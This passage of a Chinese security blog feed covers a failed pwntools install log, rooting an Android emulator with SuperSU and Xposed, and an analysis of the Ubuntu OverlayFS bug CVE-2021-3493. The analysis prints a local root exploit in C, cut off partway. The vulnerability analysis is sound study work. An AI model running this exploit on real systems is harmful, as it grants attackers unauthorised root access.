sparc-softmmu/memory.o<br>    CC    sparc64-softmmu/fpu/softfloat.o<br>    CC    sparc-softmmu/cputlb.o<br>    CC    mips64el-softmmu/memory_mapping.o<br>    CC    mips64el-softmmu/hw/mips/mips_r4k.o<br>    CC    sparc-softmmu/memory_mapping.o<br>    CC    mips64el-softmmu/hw/mips/addr.o<br>    CC    sparc64-softmmu/cpus.o<br>    CC    mips64el-softmmu/hw/mips/cputimer.o<br>    CC    sparc-softmmu/hw/sparc/leon3.o<br>    CC    sparc64-softmmu/ioport.o<br>    CC    mips64el-softmmu/target-mips/translate.o<br>    CC    sparc-softmmu/target-sparc/translate.o<br>    CC    sparc64-softmmu/memory.o<br>    CC    mips64-softmmu/target-mips/dsp_helper.o<br>    CC    sparc64-softmmu/cputlb.o<br>    CC    sparc-softmmu/target-sparc/helper.o<br>    CC    sparc-softmmu/target-sparc/cpu.o<br>    CC    sparc64-softmmu/memory_mapping.o<br>    CC    mips64-softmmu/target-mips/op_helper.o<br>    CC    sparc-softmmu/target-sparc/fop_helper.o<br>    CC    sparc64-softmmu/hw/sparc64/sun4u.o<br>    CC    sparc-softmmu/target-sparc/cc_helper.o<br>    CC    sparc64-softmmu/target-sparc/translate.o<br>    CC    sparc-softmmu/target-sparc/win_helper.o<br>    CC    sparc-softmmu/target-sparc/mmu_helper.o<br>    CC    mips64-softmmu/target-mips/lmi_helper.o<br>    CC    sparc-softmmu/target-sparc/ldst_helper.o<br>    CC    mips64-softmmu/target-mips/helper.o<br>    CC    sparc64-softmmu/target-sparc/helper.o<br>    CC    sparc-softmmu/target-sparc/int32_helper.o<br>    CC    mips64el-softmmu/target-mips/dsp_helper.o<br>    CC    mips64-softmmu/target-mips/cpu.o<br>    CC    sparc64-softmmu/target-sparc/cpu.o<br>    CC    sparc-softmmu/target-sparc/unicorn.o<br>    CC    mips64-softmmu/target-mips/msa_helper.o<br>    CC    sparc64-softmmu/target-sparc/fop_helper.o<br>    CC    mips64el-softmmu/target-mips/op_helper.o<br>    CC    sparc64-softmmu/target-sparc/cc_helper.o<br>    CC    mips64-softmmu/target-mips/unicorn.o<br>    CC    sparc64-softmmu/target-sparc/win_helper.o<br>    CC    sparc64-softmmu/target-sparc/mmu_helper.o<br>    CC    mips64el-softmmu/target-mips/lmi_helper.o<br>    CC    sparc64-softmmu/target-sparc/ldst_helper.o<br>    CC    mips64el-softmmu/target-mips/helper.o<br>    CC    mips64el-softmmu/target-mips/cpu.o<br>    CC    mips64el-softmmu/target-mips/msa_helper.o<br>    CC    mips64el-softmmu/target-mips/unicorn.o<br>    CC    sparc64-softmmu/target-sparc/int64_helper.o<br>    CC    sparc64-softmmu/target-sparc/vis_helper.o<br>    CC    sparc64-softmmu/target-sparc/unicorn64.o<br>    GEN     libunicorn.1.dylib<br>    GEN     libunicorn.a<br>  ar: creating archive libunicorn.a<br>  /Library/Developer/CommandLineTools/usr/bin/ranlib: file: libunicorn.a(qemu-timer-common.o) has no symbols<br>  /Library/Developer/CommandLineTools/usr/bin/ranlib: file: libunicorn.a(qemu-timer-common.o) has no symbols<br>  /Library/Developer/CommandLineTools/usr/bin/make -C samples<br>  make: *** samples: No such file or directory.  Stop.<br>  make: *** [all] Error 2<br>  Traceback (most recent call last):<br>    File &quot;&lt;string&gt;&quot;, line 1, in &lt;module&gt;<br>    File &quot;/private/var/folders/6k/fdkg_n356c34dm04hrnj66k00000gn/T/pip-install-vxEjTg/unicorn/setup.py&quot;, line 274, in &lt;module&gt;<br>      &#x27;unicorn&#x27;: [&#x27;lib/*&#x27;, &#x27;include/unicorn/*&#x27;]<br>    File &quot;/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/distutils/core.py&quot;, line 151, in setup<br>      dist.run_commands()<br>    File &quot;/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/distutils/dist.py&quot;, line 953, in run_commands<br>      self.run_command(cmd)<br>    File &quot;/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/distutils/dist.py&quot;, line 972, in run_command<br>      cmd_obj.run()<br>    File &quot;/System/Library/Frameworks/Python.framework/Versions/2.7/Extras/lib/python/wheel/bdist_wheel.py&quot;, line 192, in run<br>      self.run_command(&#x27;build&#x27;)<br>    File &quot;/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/distutils/cmd.py&quot;, line 326, in run_command<br>      self.distribution.run_command(command)<br>    File &quot;/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/distutils/dist.py&quot;, line 972, in run_command<br>      cmd_obj.run()<br>    File &quot;/private/var/folders/6k/fdkg_n356c34dm04hrnj66k00000gn/T/pip-install-vxEjTg/unicorn/setup.py&quot;, line 204, in run<br>      build_libraries()<br>    File &quot;/private/var/folders/6k/fdkg_n356c34dm04hrnj66k00000gn/T/pip-install-vxEjTg/unicorn/setup.py&quot;, line 177, in build_libraries<br>      shutil.copy(file, LIBS_DIR, follow_symlinks=False)<br><br>  TypeError: copy() got an unexpected keyword argument &#x27;follow_symlinks&#x27;<br>  ----------------------------------------<br><br>  ERROR: Failed building wheel for unicorn<br>  Running setup.py clean for unicorn<br>Successfully built pwn<br>Failed to build unicorn<br>Installing collected packages: unicorn, pynacl, bcrypt, paramiko, pwntools, pwn<br>  Attempting uninstall: unicorn<br>    Found existing installation: unicorn 1.0.3<br>    Uninstalling unicorn-1.0.3:<br>      Successfully uninstalled unicorn-1.0.3<br>    Running setup.py install for unicorn ... error<br>    ERROR: Command errored out with exit status 1:<br>     command: /System/Library/Frameworks/Python.framework/Versions/2.7/Resources/Python.app/Contents/MacOS/Python -u -c &#x27;import sys, setuptools, tokenize; sys.argv[0] = &#x27;&quot;&#x27;&quot;&#x27;/private/var/folders/6k/fdkg_n356c34dm04hrnj66k00000gn/T/pip-install-vxEjTg/unicorn/setup.py&#x27;&quot;&#x27;&quot;&#x27;; __file__=&#x27;&quot;&#x27;&quot;&#x27;/private/var/folders/6k/fdkg_n356c34dm04hrnj66k00000gn/T/pip-install-vxEjTg/unicorn/setup.py&#x27;&quot;&#x27;&quot;&#x27;;f=getattr(tokenize, &#x27;&quot;&#x27;&quot;&#x27;open&#x27;&quot;&#x27;&quot;&#x27;, open)(__file__);code=f.read().replace(&#x27;&quot;&#x27;&quot;&#x27;\r\n&#x27;&quot;&#x27;&quot;&#x27;, &#x27;&quot;&#x27;&quot;&#x27;\n&#x27;&quot;&#x27;&quot;&#x27;);f.close();exec(compile(code, __file__, &#x27;&quot;&#x27;&quot;&#x27;exec&#x27;&quot;&#x27;&quot;&#x27;))&#x27; install --record /private/var/folders/6k/fdkg_n356c34dm04hrnj66k00000gn/T/pip-record-bgOB1C/install-record.txt --single-version-externally-managed --user --prefix= --compile --install-headers /Users/loki/Library/Python/2.7/include/python2.7/unicorn<br>         cwd: /private/var/folders/6k/fdkg_n356c34dm04hrnj66k00000gn/T/pip-install-vxEjTg/unicorn/<br>    Complete output (31 lines):<br>    /System/Library/Frameworks/Python.framework/Versions/2.7/Extras/lib/python/setuptools/dist.py:472: UserWarning: Normalizing &#x27;1.0.2.rc3&#x27; to &#x27;1.0.2rc3&#x27;<br>      normalized_version,<br>    running install<br>    running build<br>    Building C extensions<br>    /Library/Developer/CommandLineTools/usr/bin/make -C samples<br>    make: *** samples: No such file or directory.  Stop.<br>    make: *** [all] Error 2<br>    Traceback (most recent call last):<br>      File &quot;&lt;string&gt;&quot;, line 1, in &lt;module&gt;<br>      File &quot;/private/var/folders/6k/fdkg_n356c34dm04hrnj66k00000gn/T/pip-install-vxEjTg/unicorn/setup.py&quot;, line 274, in &lt;module&gt;<br>        &#x27;unicorn&#x27;: [&#x27;lib/*&#x27;, &#x27;include/unicorn/*&#x27;]<br>      File &quot;/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/distutils/core.py&quot;, line 151, in setup<br>        dist.run_commands()<br>      File &quot;/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/distutils/dist.py&quot;, line 953, in run_commands<br>        self.run_command(cmd)<br>      File &quot;/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/distutils/dist.py&quot;, line 972, in run_command<br>        cmd_obj.run()<br>      File &quot;/System/Library/Frameworks/Python.framework/Versions/2.7/Extras/lib/python/setuptools/command/install.py&quot;, line 61, in run<br>        return orig.install.run(self)<br>      File &quot;/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/distutils/command/install.py&quot;, line 573, in run<br>        self.run_command(&#x27;build&#x27;)<br>      File &quot;/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/distutils/cmd.py&quot;, line 326, in run_command<br>        self.distribution.run_command(command)<br>      File &quot;/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/distutils/dist.py&quot;, line 972, in run_command<br>        cmd_obj.run()<br>      File &quot;/private/var/folders/6k/fdkg_n356c34dm04hrnj66k00000gn/T/pip-install-vxEjTg/unicorn/setup.py&quot;, line 204, in run<br>        build_libraries()<br>      File &quot;/private/var/folders/6k/fdkg_n356c34dm04hrnj66k00000gn/T/pip-install-vxEjTg/unicorn/setup.py&quot;, line 177, in build_libraries<br>        shutil.copy(file, LIBS_DIR, follow_symlinks=False)<br>    TypeError: copy() got an unexpected keyword argument &#x27;follow_symlinks&#x27;<br>    ----------------------------------------<br>  Rolling back uninstall of unicorn<br>  Moving to /Users/loki/Library/Python/2.7/lib/python/site-packages/unicorn-1.0.3.dist-info/<br>   from /Users/loki/Library/Python/2.7/lib/python/site-packages/~nicorn-1.0.3.dist-info<br>  Moving to /Users/loki/Library/Python/2.7/lib/python/site-packages/unicorn/<br>   from /Users/loki/Library/Python/2.7/lib/python/site-packages/~nicorn<br>ERROR: Command errored out with exit status 1: /System/Library/Frameworks/Python.framework/Versions/2.7/Resources/Python.app/Contents/MacOS/Python -u -c &#x27;import sys, setuptools, tokenize; sys.argv[0] = &#x27;&quot;&#x27;&quot;&#x27;/private/var/folders/6k/fdkg_n356c34dm04hrnj66k00000gn/T/pip-install-vxEjTg/unicorn/setup.py&#x27;&quot;&#x27;&quot;&#x27;; __file__=&#x27;&quot;&#x27;&quot;&#x27;/private/var/folders/6k/fdkg_n356c34dm04hrnj66k00000gn/T/pip-install-vxEjTg/unicorn/setup.py&#x27;&quot;&#x27;&quot;&#x27;;f=getattr(tokenize, &#x27;&quot;&#x27;&quot;&#x27;open&#x27;&quot;&#x27;&quot;&#x27;, open)(__file__);code=f.read().replace(&#x27;&quot;&#x27;&quot;&#x27;\r\n&#x27;&quot;&#x27;&quot;&#x27;, &#x27;&quot;&#x27;&quot;&#x27;\n&#x27;&quot;&#x27;&quot;&#x27;);f.close();exec(compile(code, __file__, &#x27;&quot;&#x27;&quot;&#x27;exec&#x27;&quot;&#x27;&quot;&#x27;))&#x27; install --record /private/var/folders/6k/fdkg_n356c34dm04hrnj66k00000gn/T/pip-record-bgOB1C/install-record.txt --single-version-externally-managed --user --prefix= --compile --install-headers /Users/loki/Library/Python/2.7/include/python2.7/unicorn Check the logs for full command output.<br></code></pre></td></tr></table></figure><p>谷歌了一圈相关的解决方法, 都没有成功。这时候看到可以通过brew安装pwntools，于是尝试一下。</p><h3 id="brew安装"><a href="#brew安装" class="headerlink" title="brew安装"></a>brew安装</h3><p>网上很多大佬都推荐在brew下安装pwntools，以避免pip安装时发生错误（虽然我在pip3没遇到），于是我尝试在brew下安装。执行<code>brew install pwntools</code>后，安装的版本是4.6且对应版本为python3，</p><p><img src="https://cdn.starryloki.com/2023/11/a405ffda10dbf5e2e18c94540c30c610.png" alt="image-20210803232531922"></p><p>查看资料得知最后一个带有python2的版本是3.13.0，于是尝试安装旧版pwntools：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> <span class="hljs-string">&quot;<span class="hljs-subst">$(brew --repo homebrew/core)</span>&quot;</span><br>git <span class="hljs-built_in">log</span> master -- Formula/pwntools.rb //找到合适的版本<br>git checkout 哈希值<br>HOMEBREW_NO_AUTO_UPDATE=1 brew install pwntools<br></code></pre></td></tr></table></figure><p>但是发现软件源中已经不提供这个版本的bottle了</p><p><img src="https://cdn.starryloki.com/2023/11/b7363de9dc96ad4babca4be63bfffcab.png" alt="image-20210803233146762"></p><h3 id="源码安装"><a href="#源码安装" class="headerlink" title="源码安装"></a>源码安装</h3><p>上面的办法都没办法安装，于是只能从源码入手</p><p>在<a href="https://github.com/Gallopsled/pwntools%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81%EF%BC%8C%E7%94%A8python2%E6%89%A7%E8%A1%8Csetup.py%EF%BC%9A">https://github.com/Gallopsled/pwntools下载源码，用python2执行setup.py：</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">python2 setup.py build<br>sudo python2 setup.py install<br></code></pre></td></tr></table></figure><p>这一次安装成功，安装3.13.0和4.6.0都可以，安装4.6.0时会出现编译unicorn的错误，但是可以不用理会，这时候pwntools 4.6.0已经安装进去了，而安装3.13.0时并没有unicorn这个组件所以安装非常顺利。</p><p><img src="https://cdn.starryloki.com/2023/11/2d6579ff3d083a1d7d766be1200d9a28.png" alt="image-20210803233854456"></p><p><img src="https://cdn.starryloki.com/2023/11/f1c39356b4a019b38def8917861cbfb1.png" alt="image-20210803233913801"></p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android逆向调试环境搭建</title>
      <link href="/2021/06/09/Android%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
      <url>/2021/06/09/Android%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>换了苹果全家桶后，手里的安卓设备只剩下一台3G内存的小米4，官方支持的MIUI最高的Android版本为6.0.1(API 23)，十分卡顿而且许多app无法运行，于是出现了安卓模拟器的需求。而市面的Android模拟器大多为游戏而定制，几乎没有使用原生AOSP并提供root和拓展性(可安装xposed之类的)。于是我们把目标转向Android Studio自带的模拟器：Android Studio Virtual Device (AVD)</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>Android Studio 4.1.2</p><p>Android 7.1.1 x86 (API 25)</p><p>macOS Big Sur 11.4 x86_64</p><h2 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h2><h3 id="创建虚拟机"><a href="#创建虚拟机" class="headerlink" title="创建虚拟机"></a>创建虚拟机</h3><p>在选择设备型号的时候，选不带“Play Store”的即可，之后选择镜像，根据自己的架构选择x86或arm，这里选择的是x86 Images</p><p><img src="https://cdn.starryloki.com/2023/11/41247965687b8402c37b7b9cedc03caa.png" alt="images"></p><p>值得一提的是，Android8.0以上(不含8.0)可能无法安装SuperSU来进行root，可能需要Magisk，而xposed对x86_64的系统<del>支持不是特别好</del>几乎都不支持，而带有Google APIs的镜像并不提供root权限，所以这里选择了Android 7.1.1 x86，理论上也适用于Android 8.0 x86。</p><h3 id="获得ROOT权限"><a href="#获得ROOT权限" class="headerlink" title="获得ROOT权限"></a>获得ROOT权限</h3><p>选择并下载好镜像后就可以进入系统了，进入系统并不能从Android Studio进入，我们需要用命令进入并附加<code>-writable-system</code>参数：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">emulator -avd 模拟器名 -writable-system<br></code></pre></td></tr></table></figure><p>接下来我们需要获取root权限:</p><p>系统自带的root权限只能从adb调用，并不能给里面的app使用，所以我们利用adb中的root权限刷入SuperSU</p><p>首先以root身份运行adb：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">adb root<br>adb remount<br></code></pre></td></tr></table></figure><p>之后再进入adb shell，如无意外应该是获得root的shell：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">adb shell<br>generic_x86:/ # setenforce 0<br></code></pre></td></tr></table></figure><p>之后我们将SuperSU刷机包下x86目录里面的su.pie文件push到&#x2F;system&#x2F;bin和system&#x2F;xbin目录下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">adb push su.pie /system/bin/su<br>adb push su.pie /system/xbin/su<br></code></pre></td></tr></table></figure><p>之后进入adb shell(root)，将su文件设成可执行并安装su：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> 0755 /system/bin/su<br><span class="hljs-built_in">chmod</span> 0755 /system/xbin/su<br>su --install<br>su --daemon&amp;<br></code></pre></td></tr></table></figure><p>之后退出adb shell，安装SuperSU程序和Xposed Installer：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">adb install supersu.apk<br>adb install xposedinstaller.apk<br></code></pre></td></tr></table></figure><p>安装完成后运行SuperSU，点击New User，之后弹出的对话框询问时候更新二进制，点击取消即可正常使用SuperSU了。</p><h3 id="安装Xposed"><a href="#安装Xposed" class="headerlink" title="安装Xposed"></a>安装Xposed</h3><p>我们已经获取了Root权限，接下来需要安装Xposed。</p><p>打开Xposed Installer，点击安装。这里可能会出现无法获取zip之类的错误，科学上网即可。</p><p>安装时需要root权限，允许即可，安装完成后重启就会发现xposed已经安装完成了：</p><p><img src="https://cdn.starryloki.com/2023/11/0de1bab425638317178ef6a4f6ac6b4a.png" alt="finish"></p><h3 id="一些问题"><a href="#一些问题" class="headerlink" title="一些问题"></a>一些问题</h3><p>这个SuperSU的root权限重启就会消失，消失后需要重新走一遍root流程，xposed则不受影响。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>于是我们已经顺利搭建好环境了，再安装逆向或脱壳之后一些模块就能开展工作了。</p><p>EOF</p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> 虚拟机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-3493漏洞分析</title>
      <link href="/2021/06/02/CVE-2021-3493%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2021/06/02/CVE-2021-3493%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>OverlayFS 是一种叠合式文件系统，能够在底层文件系统上叠加另一个文件系统，Linux 内核中 overlayfs 文件系统是 Ubuntu 的特定问题，由于没有正确的验证文件系统功能在用户名称空间中的应用，从而导致攻击者可以安装一个允许未授权挂载的 overlayfs 修补程序来提升权限</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>见 <a href="https://starryloki.cn/2021/05/27/Ubuntu%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2021-3493/">Ubuntu内核提权漏洞复现(CVE-2021-3493)</a></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="Overlayfs"><a href="#Overlayfs" class="headerlink" title="Overlayfs"></a>Overlayfs</h3><p>Overlayfs是一种类似aufs的一种堆叠文件系统,它依赖并建立在其它的文件系统之上（例如ext4fs和xfs等等），并不直接参与磁盘空间结构的划分，仅仅将原来底层文件系统中不同的目录进行“合并”，然后向用户呈现。因此对于用户来说，它所见到的overlay文件系统根目录下的内容就来自挂载时所指定的不同目录的“合集”。</p><center>![效果图](https://cdn.starryloki.com/2023/11/8966dcc1d078f65d886e06b244d02623.png)<br>效果图</center><h3 id="Linux-Capability机制"><a href="#Linux-Capability机制" class="headerlink" title="Linux Capability机制"></a>Linux Capability机制</h3><p>Linux内核2.2之后引入了capabilities机制，此前Linux的进程有两类: privileged (effective UID &#x3D; 0)和unprivileged (effective UID !&#x3D; 0)，前者的进程可以绕过所有的内核权限检查，后者则需要进行严格的权限检查。引入capabilities之后，系统会检查effective UID ! &#x3D; 0进程的capabilities来确认进程是否有执行特权操作的权限。<br>Linux下可以通过<code>man capabilities</code>来列出capabilities。</p><h3 id="User-Namespaces"><a href="#User-Namespaces" class="headerlink" title="User Namespaces"></a>User Namespaces</h3><p>User Namespaces用于隔离用户和用户组，一个用户可以在一个user namespace中是普通用户，但在另一个user namespace中是超级用户。Linux中<code>/proc/PID/uid_map</code>和<code>/proc/PID/gie_map</code>中存储着映射关系，映射关系格式为<code>ID-inside-ns ID-outside-ns length</code>，比如 <code>0 1000 500</code> 表明父user namespace中的1000-1500映射到新user namespace中的0-500。</p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>一般情况下挂载文件系统需要特权，而在Ubuntu中，普通用户就可以挂载Overlayfs，这源于linux_5.4.0-26-30的更新，在ovl_fs_type结构体中添加了fs_flags数据域，对应值为<code>FS_USERNS_MOUNT</code></p><center>![update](https://cdn.starryloki.com/2023/11/99536c80662456c4ff6319b98b9deed5.png)<br>linux_5.4.0-26-30中对ovl_fs_type结构体的修改</center><p>这样一来，普通用户也能挂载overlay文件系统，挂载时经过了<del>看不懂的</del>复杂的函数调用链，使得挂载进程的user namespace获得了root权限</p><p>而在调用setxattr()函数对文件扩展属性的capability进行设置时，权限校验不彻底，于是可以将文件的capability设置成all+ep，具有高权限。</p><h3 id="EXP分析"><a href="#EXP分析" class="headerlink" title="EXP分析"></a>EXP分析</h3><p>首先附上完整EXP：</p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;err.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mount.h&gt;</span></span><br><br><span class="hljs-comment">//#include &lt;attr/xattr.h&gt;</span><br><span class="hljs-comment">//#include &lt;sys/xattr.h&gt;</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">setxattr</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *name, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *value, <span class="hljs-type">size_t</span> size, <span class="hljs-type">int</span> flags)</span>;<br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DIR_BASE    <span class="hljs-string">&quot;./ovlcap&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DIR_WORK    DIR_BASE <span class="hljs-string">&quot;/work&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DIR_LOWER   DIR_BASE <span class="hljs-string">&quot;/lower&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DIR_UPPER   DIR_BASE <span class="hljs-string">&quot;/upper&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DIR_MERGE   DIR_BASE <span class="hljs-string">&quot;/merge&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BIN_MERGE   DIR_MERGE <span class="hljs-string">&quot;/magic&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BIN_UPPER   DIR_UPPER <span class="hljs-string">&quot;/magic&quot;</span></span><br><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">xmkdir</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span class="hljs-type">mode_t</span> mode)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (mkdir(path, mode) == <span class="hljs-number">-1</span> &amp;&amp; errno != EEXIST)<br>        err(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;mkdir %s&quot;</span>, path);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">xwritefile</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *data)</span><br>&#123;<br>    <span class="hljs-type">int</span> fd = open(path, O_WRONLY);<br>    <span class="hljs-keyword">if</span> (fd == <span class="hljs-number">-1</span>)<br>        err(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;open %s&quot;</span>, path);<br>    <span class="hljs-type">ssize_t</span> len = (<span class="hljs-type">ssize_t</span>) <span class="hljs-built_in">strlen</span>(data);<br>    <span class="hljs-keyword">if</span> (write(fd, data, len) != len)<br>        err(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;write %s&quot;</span>, path);<br>    close(fd);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">xcopyfile</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *src, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *dst, <span class="hljs-type">mode_t</span> mode)</span><br>&#123;<br>    <span class="hljs-type">int</span> fi, fo;<br><br>    <span class="hljs-keyword">if</span> ((fi = open(src, O_RDONLY)) == <span class="hljs-number">-1</span>)<br>        err(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;open %s&quot;</span>, src);<br>    <span class="hljs-keyword">if</span> ((fo = open(dst, O_WRONLY | O_CREAT, mode)) == <span class="hljs-number">-1</span>)<br>        err(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;open %s&quot;</span>, dst);<br><br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">4096</span>];<br>    <span class="hljs-type">ssize_t</span> rd, wr;<br><br>    <span class="hljs-keyword">for</span> (;;) &#123;<br>        rd = read(fi, buf, <span class="hljs-keyword">sizeof</span>(buf));<br>        <span class="hljs-keyword">if</span> (rd == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (rd == <span class="hljs-number">-1</span>) &#123;<br>            <span class="hljs-keyword">if</span> (errno == EINTR)<br>                <span class="hljs-keyword">continue</span>;<br>            err(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;read %s&quot;</span>, src);<br>        &#125;<br><br>        <span class="hljs-type">char</span> *p = buf;<br>        <span class="hljs-keyword">while</span> (rd &gt; <span class="hljs-number">0</span>) &#123;<br>            wr = write(fo, p, rd);<br>            <span class="hljs-keyword">if</span> (wr == <span class="hljs-number">-1</span>) &#123;<br>                <span class="hljs-keyword">if</span> (errno == EINTR)<br>                    <span class="hljs-keyword">continue</span>;<br>                err(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;write %s&quot;</span>, dst);<br>            &#125;<br>            p += wr;<br>            rd -= wr;<br>        &#125;<br>    &#125;<br><br>    close(fi);<br>    close(fo);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">exploit</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">4096</span>];<br><br>    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;rm -rf &#x27;%s/&#x27;&quot;</span>, DIR_BASE);<br>    system(buf);<br><br>    xmkdir(DIR_BASE, <span class="hljs-number">0777</span>);<br>    xmkdir(DIR_WORK,  <span class="hljs-number">0777</span>);<br>    xmkdir(DIR_LOWER, <span class="hljs-number">0777</span>);<br>    xmkdir(DIR_UPPER, <span class="hljs-number">0777</span>);<br>    xmkdir(DIR_MERGE, <span class="hljs-number">0777</span>);<br><br>    <span class="hljs-type">uid_t</span> uid = getuid();<br>    <span class="hljs-type">gid_t</span> gid = getgid();<br><br>    <span class="hljs-keyword">if</span> (unshare(CLONE_NEWNS | CLONE_NEWUSER) == <span class="hljs-number">-1</span>)<br>        err(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;unshare&quot;</span>);<br><br>    xwritefile(<span class="hljs-string">&quot;/proc/self/setgroups&quot;</span>, <span class="hljs-string">&quot;deny&quot;</span>);<br><br>    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;0 %d 1&quot;</span>, uid);<br>    xwritefile(<span class="hljs-string">&quot;/proc/self/uid_map&quot;</span>, buf);<br><br>    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;0 %d 1&quot;</span>, gid);<br>    xwritefile(<span 